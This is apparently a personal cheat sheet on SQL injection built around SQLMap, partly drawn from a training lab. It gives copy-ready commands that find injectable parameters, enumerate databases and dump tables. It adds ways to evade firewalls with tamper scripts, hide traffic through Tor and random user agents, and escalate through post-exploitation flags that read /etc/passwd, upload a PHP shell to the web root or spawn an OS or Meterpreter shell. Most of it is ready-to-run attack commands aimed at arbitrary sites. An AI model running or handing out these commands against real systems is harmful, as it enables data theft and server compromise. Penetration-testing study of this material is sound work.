# SQL Injection

SQL injection is a prevalent vulnerability and has long been a hot topic in
cyber security. To understand this vulnerability, we must first learn what a
database is and how websites interact with a database.

## Discovery → Verification → Exploitation

### 🛠️ Step 1: Discovery (Finding the URL)

Before you can use SQLMap, you need to find URLs that actually talk to a
database.

Manual Crawling: Look for URLs with parameters like ?id=, ?cat=, or ?product=.

Burp Suite (Free/Pro): This is the industry-standard tool. As you browse a site,
Burp maps out every request. You can look at the "HTTP History" to see which
pages use GET or POST parameters.

Gau / Waybackurls: These command-line tools fetch all URLs ever indexed for a
domain (from Google or the Wayback Machine), helping you find "hidden"
parameters without even touching the live server.

### 🧪 Step 2: Verification (The "Single Quote" Test)

Once you find a suspicious URL like site.com/product.php?id=10, you do a quick
manual check to see if it's "fragile."

Add a single quote (') to the end of the URL: site.com/product.php?id=10'

Look for a reaction:

Vulnerable: The page breaks, shows a SQL error (e.g., "You have an error in your
SQL syntax"), or content disappears.

Secure: The page loads normally or gives a clean "404 Not Found" / "Invalid
Input" message.

#### 🚨 Common SQL Error Messages

If you see these in your browser, the site is likely susceptible to injection:

| Database Type | Error Message to Look For                                       |
| ------------- | --------------------------------------------------------------- |
| MySQL         | you have an error in your SQL syntax; check the manual...       |
| PostgreSQL    | PostgreSQL query failed: ERROR: syntax error at or near...      |
| Microsoft SQL | Unclosed quotation mark after the character string...           |
| Oracle        | ORA-00933: SQL command not properly ended                       |
| Generic       | Internal Server Error (500) or a page that suddenly goes blank. |
|               |

### 🤖 Step 3: Exploitation (Using SQLMap)

Only after the page "breaks" with a single quote do you bring in SQLMap to do
the heavy lifting.

## SQL Map

SQLMap is an automated tool for detecting and exploiting SQL injection
vulnerabilities in web applications. It simplifies the process of identifying
these vulnerabilities. This tool is built into some Linux distributions, but you
can easily install it if it's not.

use the --wizard flag with SQLMap. When you use this flag, the tool will guide
you through each step and ask questions to complete the scan, making this a
perfect option for beginners.

The --dbs flag helps you to extract all the database names. Once you get to know
the database names, you can extract information about the tables of that
database by using -D database_name --tables.

```bash
-D database_name -T table_name --dump
```

if you see any web application using GET parameters in the URLs to retrieve
data, you can test that URL with the -u flag in the SQLMap tool. This is
considered to be HTTP GET-based testing. This approach is followed when the
application uses GET parameters in the URL to retrieve data from the searches.

URLs that have GET parameters can be vulnerable to SQL injection; let us scan
this URL to identify if it has any SQL injection vulnerability.

Example:

```bash
sqlmap -u http://sqlmaptesting.thm/search/cat=1
```

To fetch the databases, we use the flag --dbs. Let's try this flag out with our
vulnerable URL:

```bash
sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs
```

After running the above command, we got two database names. Select the users
database and fetch the tables inside of it. We will define the database after
the flag -D and use the --tables flag at the end to extract all the table names.

```bash
sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
```

Now that we have all the available table names of the database, let's dump the
records present in the [Table] (thomas as an example) table. To do so, we will
define the database with the -D flag, the table with the -T flag, and for
extracting the records of the table, we will use the --dump flag.

```bash
sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users -T thomas --dump
```

unlike the URL used for testing above, you can also use POST-based testing,
where the application sends data in the request's body instead of the URL.
Examples of this could be login forms, registration forms, etc. To follow this
approach, you must intercept a POST request on the login or registration page
and save it as a text file. You can use the following command to input that
request saved in the text file to the SQLMap tool:

```bash
sqlmap -r intercepted_request.txt
```

Note:

If you suspect a website is using GET - To get the complete URL along with its
GET parameters, we need to right-click on the login page and click the inspect
option (the process may vary slightly from browser to browser). From here, we
have to select the Network tab; then we have to enter some test credentials in
the username and password fields and click the login button, and we will be able
to see the GET request. Click on that request, and we can see the complete GET
request with the parameters. We can copy this complete URL and use it with the
SQLMap tool to discover SQL injection vulnerabilities inside it and exploit it.

```bash
sqlmap -u 'http://10.64.129.84/ai/includes/user_login?email=test&password=test' --dbs
```

## Full Workflow

### 🛡️ SQLMap Quick-Copy Cheat Sheet

#### 1. Core Workflow (GET vs POST)

##### 🌐 GET Method (URL Parameters)

```bash
# 1. Find Databases
sqlmap -u "http://site.com/id=1" --dbs --batch

# 2. List Tables
sqlmap -u "http://site.com/id=1" -D <db_name> --tables --batch

# 3. Dump Data
sqlmap -u "http://site.com/id=1" -D <db_name> -T <table_name> --dump --batch
```

##### 📩 POST Method (Request Files)

Save your intercepted request as request.txt first.

```bash
# 1. Find Databases

sqlmap -r request.txt --dbs --batch

# 2. List Tables

sqlmap -r request.txt -D <db_name> --tables --batch

# 3. Dump Data

sqlmap -r request.txt -D <db_name> -T <table_name> --dump --batch
```

#### 2. Authentication & Sessions

| Goal        | Flag                                      |
| ----------- | ----------------------------------------- |
| Cookies     | --cookie="PHPSESSID=12345"                |
| Headers     | -H "X-Forwarded-For: 127.0.0.1"           |
| Login Creds | --auth-type Basic --auth-cred "user:pass" |

#### 🛡️ 3. Bypassing Firewalls (WAF)

##### Stealth Combo

```bash
--random-agent --tamper=space2comment,randomcase,charencode
```

Common Tampers:

```bash
space2comment : Replaces spaces with /\*\*/

randomcase : Changes SELECT to sElEcT

equaltolike : Changes = to LIKE

```

#### 🕵️ 4. Proxy & Anonymity

```bash

# Route through Burp Suite
--proxy="http://127.0.0.1:8080"

# Route through Tor
--tor --check-tor

```

#### ⚡ 5. Essential Shortcuts

| Flag         | Description                            |
| ------------ | -------------------------------------- |
| --batch      | Skip all prompts (chooses default).    |
| --threads=10 | Maximum extraction speed.              |
| --level=5    | Check Headers & Cookies for injection. |
| --risk=3     | Use more aggressive/risky payloads.    |
| --os-shell   | Attempt to get a command shell.        |
| --file-read  | "Read files (e.g. /etc/passwd)."       |

#### 🛠️ 6. Useful One-Liners

```bash

# Scan a specific parameter ONLY (e.g., 'id')
sqlmap -u "http://site.com/id=1&user=test" -p id --dbs


# Beginner Wizard Mode
sqlmap --wizard

```

#### 🎯 7. Targeting Specific Parameters

Use these to save time and reduce the number of "noisy" requests sent to the
server.

The -p Flag (Explicit Targeting) Instead of letting SQLMap guess, tell it
exactly which parameter to attack.

```bash

# Only test the 'id' parameter, ignore 'session' or 'lang'
sqlmap -u "http://site.com/view.php?id=1&lang=en&session=99" -p id --dbs

```

The Custom Injection Point (_) If the URL is "pretty" (RESTful) or the injection
is in a weird spot (like a header), use an asterisk_ to mark the spot.

```bash

# Pretty URL injection
sqlmap -u "http://site.com/user/101*/profile" --dbs

# Header injection (User-Agent)
sqlmap -u "http://site.com/" --user-agent="MyBrowser*" --dbs

```

#### ⚡ 8. Advanced Data Extraction Filters

Once you've found the tables, you don't always need to dump the entire database.

| Goal                    | Command                                  |
| ----------------------- | ---------------------------------------- |
| Dump Specific Columns   | -D db -T users -C "user,password" --dump |
| Dump First 5 Rows       | --start 1 --stop 5                       |
| Search for Table Names  | --search -T "admin"                      |
| Search for Column Names | --search -C "pass"                       |

##### 🚀 The "Panic" Command

If you are in a rush and need a result now, use this "Aggressive One-Liner":

```bash
sqlmap -u "URL" --batch --threads=10 --level=3 --risk=2 --random-agent --dbms=MYSQL
```

#### 🛠️ 9. Common Errors & Troubleshooting

❌ Error: "Target URL appears not to be injectable" If you are sure it is
vulnerable but SQLMap fails, try these:

Increase Level/Risk:

```bash
sqlmap -u [URL] --level=5 --risk=3
```

Use a Tamper Script: The WAF might be blocking standard payloads. Try

```bash
--tamper=space2comment
```

Check the Cookie: Your session might have expired. Refresh your browser and copy
the new cookie.

❌ Error: "Connection timed out" or "403 Forbidden" Add a Delay: The server
might have rate-limiting. Use

```bash
--delay=1

or

--delay=2
```

Change User-Agent: Use

```bash
--random-agent
```

Some sites block the default User-Agent: sqlmap.

Use a Proxy: Your IP might be temporarily soft-blocked. Use

```bash
--proxy
```

❌ Error: "Internal Server Error (500)" This often means the SQL injection is
working but crashing the query. Try using a specific DBMS flag to make the
payloads cleaner: --dbms=mysql (or postgresql, mssql).

#### 🛑 10. Post-Exploitation (File & OS Access)

If the database user has high privileges (like 'root' or 'sa'), you can go
beyond data theft.

| Command                                               | Action                                                      |
| ----------------------------------------------------- | ----------------------------------------------------------- |
| --file-read="/etc/passwd"                             | Read a system file from the server.                         |
| --file-write="shell.php" --file-dest="/var/www/html/" | Upload a file to the web directory                          |
| --os-shell                                            | Attempt to gain an interactive command prompt.              |
| --os-pwn                                              | Attempt to spawn a Meterpreter shell (requires Metasploit). |

#### 📋 The "Complete Checklist" One-Liner

If you want to run a thorough scan with every "best practice" enabled:

```bash
sqlmap -u "http://target.com/id=1" --batch --random-agent --level=3 --risk=2 --threads=5 --dbs
```

This command is essentially the "Advanced Standard" for professional scanning.
It balances speed, stealth, and thoroughness.

Here is the breakdown of each component:

sqlmap The base command that launches the tool.

```bash
-u "http://target.com/id=1" The Target: Specifies the URL to test.
```

Tip: Always wrap the URL in double quotes. This prevents the terminal from
misinterpreting special characters like & or ? as shell commands.

```bash
--batch
```

Automate Everything: Tells SQLMap to never ask for user input. It will
automatically choose the default/recommended option for every question (e.g.,
"Do you want to skip testing other parameters?").

Use Case: Perfect for running scans in the background or within scripts.

```bash
--random-agent
```

Stealth: SQLMap's default identity is often blocked by Firewalls. This flag
picks a real, random browser identity (like Chrome on Windows or Safari on Mac)
for every session.

Result: It makes your automated traffic look like a human visitor.

```bash
--level=3
```

Depth of Search: By default (Level 1), SQLMap only tests URL parameters.

Level 3 expands the search to include HTTP Headers (like Referer) and Cookies.
This is crucial because many modern vulnerabilities are hidden in session data
rather than the URL.

```bash
--risk=2
```

Payload Intensity: Level 1 is safe and quiet.

Risk 2 adds heavy query-based tests (like OR-based injections). While more
effective, it carries a small risk of accidentally updating or changing data in
the database. Use with caution on live production sites.

```bash
--threads=5
```

Performance: SQLMap usually sends one request at a time. This tells it to send 5
requests simultaneously.

Result: It makes data extraction significantly faster.

Note: Avoid going above 10, as it may crash the web server or trigger a DDoS
alarm.

```bash
--dbs
```

The Objective: This is the action flag. It tells SQLMap: "If you find a hole,
don't just stop—list all the database names you can find."

| Flag           | Category   | Purpose                          |
| -------------- | ---------- | -------------------------------- |
| -u             | Targeting  | Where to attack.                 |
| --batch        | Automation | Hands-free operation.            |
| --random-agent | Stealth    | Bypass basic User-Agent filters. |
| --level=3      | Depth      | Scan Headers and Cookies.        |
| --risk=2       | Intensity  | Use more aggressive payloads.    |
| --threads=5    | Speed      | Faster data retrieval.           |
| --dbs          | Goal       | Enumerate all databases.         |
